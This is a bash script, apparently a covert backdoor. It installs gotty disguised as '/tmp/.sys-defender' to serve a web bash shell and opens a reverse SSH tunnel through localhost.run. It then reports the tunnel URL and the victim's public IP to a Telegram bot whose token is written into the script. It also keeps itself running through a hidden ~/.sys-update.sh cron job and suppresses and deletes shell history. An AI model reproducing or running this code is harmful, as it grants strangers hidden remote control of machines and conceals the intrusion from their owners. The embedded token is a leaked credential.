#!/bin/bash

# Author: insanerask
# Date: 2024-10-18

# Enable/disable debugging
DEBUG=OFF  # Change to OFF to disable debugging
SCRIPT_URL="https://raw.githubusercontent.com/insanerask77/scripts/refs/heads/main/localhost.sh"
TELEGRAM_TOKEN="7286230708:AAHDVeaQ6PjTUHytirkhhTpyhtCLyMW-8fg"  # Replace with your bot's TELEGRAM_TOKEN
TELEGRAM_CHAT_ID="633147286"  # Replace with your chat_id
# Function to print debug messages
function debug {
    if [[ "$DEBUG" == "ON" ]]; then
        echo -e "\033[1;34m[DEBUG] $1\033[0m"  # Message in blue
    fi
}

# Disable history to prevent commands from being recorded
set +o history

# Function to install gotty in the background
function install_gotty {
    debug "Installing gotty..."
    if /tmp/.gotty -v > /dev/null 2>&1; then
        debug "Gotty is already installed."
    else
        wget -q https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz     
        tar -C /tmp -xzf gotty_linux_amd64.tar.gz > /dev/null 2>&1
        mv /tmp/gotty /tmp/.sys-defender
        rm -f gotty_linux_amd64.tar.gz > /dev/null 2>&1
        debug "Gotty installed successfully."
    fi   
}

# Call the function to install gotty
install_gotty   

# Function to start gotty in the background
function start_gotty {
    debug "Starting gotty..."
    if pgrep -f "/tmp/.sys-defender -p 6789 -w bash" > /dev/null 2>&1; then
        debug "Gotty is already running."
    else
        # Use 'nohup' and redirect stdout and stderr to /dev/null so nothing is shown
        nohup /tmp/.sys-defender -p 6789 -w bash -l > /dev/null 2>&1 &

        # Ensure the process remains in the background and doesn't depend on the terminal
        disown

        debug "Gotty started in the background."
    fi
}

# Call the function to start gotty
start_gotty

# Function to check if the URL is valid
function is_url_active {
    local url="$1"
    debug "Checking the URL: $url"
    
    response=$(curl -o /dev/null -s -w "%{http_code}\n" "$url")
    debug "Server response: $response"
    
    if [[ "$response" == "200" ]]; then
        debug "The URL is valid."
        return 0  # The URL is valid
    elif [[ "$response" == "502" ]]; then
        debug "The URL is not valid (502)."
        return 1  # The URL is not valid (502)
    else
        debug "The URL returned an unexpected code: $response."
        return 1  # Any other code is also considered invalid
    fi
}

# Function to start the SSH tunnel and generate the URL
function start_ssh {
    LOGFILE=/tmp/.$((100000 + RANDOM % 900000)).log
    debug "Starting SSH connection..."

    # Check if there is already an active SSH connection
    if pgrep -f "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:6789 nokey@localhost.run" > /dev/null 2>&1; then
        debug "SSH connection is already active. Checking URL..."

        # Find the last generated log file
        LAST_LOGFILE=$(ls -t /tmp/.*.log 2>/dev/null | head -n 1)

        if [[ -f "$LAST_LOGFILE" && -s "$LAST_LOGFILE" ]]; then
            URL=$(grep -o 'https://[0-9a-zA-Z\.]*' "$LAST_LOGFILE")
            debug "Last URL obtained: $URL"

            # Check if the URL is still active
            if is_url_active "$URL"; then
                debug "The URL is still active. No need to restart the SSH connection."
                return  # Exit without doing anything
            else
                debug "The URL is no longer valid. Restarting SSH connection..."
                kill -9 $(pgrep -f "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:6789 nokey@localhost.run") > /dev/null 2>&1
            fi
        else
            debug "No valid log file found."
        fi
    fi

    # Start new SSH connection
    nohup ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:6789 nokey@localhost.run > "$LOGFILE" 2>&1 &
    sleep 5
    debug "SSH connection started."
    echo "$LOGFILE"
}

# Function to send the generated link
function send_link {
    LOGFILE=$(start_ssh)
    debug "Retrieving URL from log..."

    # Find the last generated log file
    LAST_LOGFILE=$(ls -t /tmp/.*.log 2>/dev/null | head -n 1)

    # Check if the log file exists and is not empty
    if [[ -f "$LAST_LOGFILE" && -s "$LAST_LOGFILE" ]]; then
        URL=$(grep -o 'https://[0-9a-zA-Z\.]*' "$LAST_LOGFILE")

        # Check if a URL was obtained
        if [[ -n "$URL" ]]; then
            debug "URL obtained: $URL"
            # Get the public IP of the system
            IP=$(curl -s http://ipecho.net/plain)
            debug "Public IP: $IP"

            # Send the URL and IP via Telegram bot
            MESSAGE="New Connection at: $URL from IP: $IP"
            
            curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
                -d chat_id="$TELEGRAM_CHAT_ID" \
                -d text="$MESSAGE" > /dev/null 2>&1
            debug "Notification sent to Telegram."
        else
            debug "Failed to obtain the URL from the log."
        fi
    else
        debug "Log file does not exist or is empty."
    fi
}

# Call the function to send the link
send_link

# Function to install a cron job for persistence
function install_cron {
    debug "Installing cron job..."
    CRON_JOB="*/5 * * * * $HOME/.sys-update.sh"

    # Check if the script file exists
    if [[ ! -f "$HOME/.sys-update.sh" ]]; then
        debug "Script file does not exist. Installing the script from the URL."
        # Copy the current script to a hidden file in the HOME directory
        curl -fsSL "$SCRIPT_URL" -o "$HOME/.sys-update.sh"
        chmod +x "$HOME/.sys-update.sh"
    else
        debug "Script file already exists."
    fi

    # Check if the cron job is already installed
    if crontab -l 2>/dev/null | grep -q "$HOME/.sys-update.sh"; then
        debug "Cron job is already installed."
    else
        # Add a cron job to run the script every 30 minutes
        (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
        debug "Cron job installed."
    fi
}

# Call the function to ensure persistence via cron
install_cron

# Function to delete recent command history
function delete_history {
    LAST_ENTRY=$(history | tail -n 1 | awk '{print $1}')
    if [[ -n "$LAST_ENTRY" ]]; then
        history -d $LAST_ENTRY
        debug "Last history entry deleted."
    fi
}

# Call the function to delete history
delete_history

# Restore history at the end of the script
set -o history
